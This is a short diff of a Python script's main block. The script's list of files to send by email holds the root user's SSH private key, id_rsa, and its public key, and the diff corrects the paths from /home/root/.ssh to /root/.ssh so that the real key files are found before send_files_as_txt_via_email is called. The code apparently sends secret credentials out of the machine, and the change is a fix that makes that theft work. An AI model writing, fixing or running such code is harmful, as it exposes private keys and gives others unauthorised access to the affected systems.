@@ -41,7 +41,7 @@ if __name__ == "__main__":
     email_address = 'testsingtest@outlook.com'
     password = ''
     files_to_send = [
-        '/home/root/.ssh/id_rsa.pub',
-        '/home/root/.ssh/id_rsa'
+        '/root/.ssh/id_rsa.pub',
+        '/root/.ssh/id_rsa'
     ]
     send_files_as_txt_via_email(email_address, password, files_to_send, enableDebug=True)
